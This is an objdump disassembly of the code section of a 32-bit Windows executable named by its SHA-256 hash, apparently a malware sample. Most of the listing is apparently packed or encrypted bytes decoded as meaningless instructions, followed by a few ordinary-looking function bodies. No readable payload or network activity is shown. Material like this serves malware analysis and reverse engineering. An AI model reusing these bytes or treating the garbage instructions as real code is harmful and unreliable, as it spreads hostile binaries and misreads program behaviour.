
bf7897b7e40b85457624ced0aeb98177f90ecf09740e980b772f2a375c3ccc38.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	jno    0x4cffe4
  4d0002:	adc    al,0x88
  4d0004:	mov    dh,0x1
  4d0006:	pushf  
  4d0007:	or     al,0x89
  4d0009:	outs   dx,BYTE PTR ds:[esi]
  4d000a:	imul   DWORD PTR [ebx]
  4d000c:	or     bh,bl
  4d000e:	es aaa 
  4d0010:	out    dx,eax
  4d0011:	mov    bh,0xb1
  4d0013:	shr    DWORD PTR ds:0x24bab6b0,1
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0673
  4d06c1:	div    eax
  4d06c3:	imul   esp,DWORD PTR [eax+eiz*1],0x45
  4d06c7:	push   ebx
  4d06c8:	loopne 0x4d06ba
  4d06ca:	xchg   DWORD PTR [ecx],ebx
  4d06cc:	loop   0x4d06ca
  4d06ce:	lock mov bh,0xbd
  4d06d1:	test   DWORD PTR [ecx+0x22],ebp
  4d06d4:	pop    ss
  4d06d5:	mov    ds:0x26396d04,al
  4d06da:	xchg   edi,eax
  4d06db:	call   0x489f:0xa5fb9301
  4d06e2:	xchg   edi,eax
  4d06e3:	inc    esi
  4d06e4:	xchg   ebp,eax
  4d06e5:	pop    edi
  4d06e6:	out    0x18,al
  4d06e8:	push   eax
  4d06e9:	dec    edi
  4d06ea:	shl    DWORD PTR [eax-0x75],0xff
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x24
  4d06f4:	lea    edx,ds:0x4d3070
  4d06fa:	sbb    esi,0x1a
  4d06fd:	push   edx
  4d06fe:	push   DWORD PTR [edx+0x24]
  4d0701:	push   DWORD PTR [edx+0x4]
  4d0704:	push   DWORD PTR [edx+0x1d8]
  4d070a:	call   0x4d11a8
  4d070f:	add    esp,0xc
  4d0712:	pop    edx
  4d0713:	push   edx
  4d0714:	mov    esi,0x0
  4d0719:	push   esi
  4d071a:	call   0x4d10e4
  4d071f:	add    esp,0x4
  4d0722:	pop    edx
  4d0723:	push   edx
  4d0724:	push   0x0
  4d0726:	call   0x4d0bf8
  4d072b:	add    esp,0x4
  4d072e:	pop    edx
  4d072f:	add    esp,0x24
  4d0732:	pop    ebp
  4d0733:	ret    
  4d0734:	pop    edi
  4d0735:	call   DWORD PTR ds:0x4d2010
  4d073b:	call   edi
  4d073d:	add    BYTE PTR [eax],al
  4d073f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0745:	sub    esp,0x58
  4d0748:	lea    ecx,[edi+0x104]
  4d074e:	xor    DWORD PTR [ebp-0x34],esi
  4d0751:	push   ecx
  4d0752:	push   edx
  4d0753:	push   DWORD PTR [ecx+0x70]
  4d0756:	push   edx
  4d0757:	call   0x4d0bb0
  4d075c:	add    esp,0xc
  4d075f:	pop    ecx
  4d0760:	push   ecx
  4d0761:	push   0x0
  4d0763:	call   0x4d1144
  4d0768:	add    esp,0x4
  4d076b:	pop    ecx
  4d076c:	push   ecx
  4d076d:	push   0x0
  4d076f:	call   0x4d0bf8
  4d0774:	add    esp,0x4
  4d0777:	pop    ecx
  4d0778:	add    esp,0x58
  4d077b:	pop    ebp
  4d077c:	ret    
  4d077d:	add    BYTE PTR [eax],al
  4d077f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0785:	sub    esp,0x48
  4d0788:	lea    esi,ds:0x4d30c0
